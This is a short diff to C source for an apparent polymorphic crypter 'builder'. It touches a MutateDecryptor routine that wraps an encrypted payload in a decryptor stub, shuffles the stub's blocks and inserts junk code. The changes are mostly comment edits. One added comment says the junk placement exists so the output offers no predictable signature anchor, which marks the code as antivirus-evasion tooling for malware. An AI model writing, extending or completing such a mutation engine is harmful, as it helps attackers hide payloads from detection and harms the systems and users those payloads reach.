@@ -43,9 +43,8 @@
 #include <intrin.h>
 #include <string.h>
 
-/* Local XORshift PRNG — replaces stdlib rand()/srand().
- * Keeps MutationEngine consistent with the XORshift pattern used in
- * Crypto.c and Common.c; also removes the stdlib.h dependency. */
+/* rolled our own xorshift here — same as Crypto.c/Common.c, keeps the
+ * builder from having two separate PRNG states running at the same time */
 static unsigned int g_mut_rand_state = 0;
 
 static void mut_srand(unsigned int seed) {
@@ -465,7 +464,7 @@ BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
   }
 
   SIZE_T maxStubSize = originalStubSize * 4 + 256;
-  if (payloadLen > (SIZE_T)-1 - maxStubSize) return FALSE;
+  if (payloadLen > (SIZE_T)-1 - maxStubSize) return FALSE; /* overflow wraps to tiny alloc, heap corruption follows */
   SIZE_T bufSize = maxStubSize + payloadLen;
   BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize);
   if (!buf)
@@ -527,7 +526,8 @@ BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
    */
   int blockB_imm_offset = -1;  /* offset imm32 in mov edx */
 
-  /* Emit blocks in random order with junk in between */
+  /* emit blocks in shuffled order — junk before every block including the
+   * first one so offset 0 isn't a predictable signature anchor */
   for (int i = 0; i < 4; i++) {
     int idx = order[i];
 
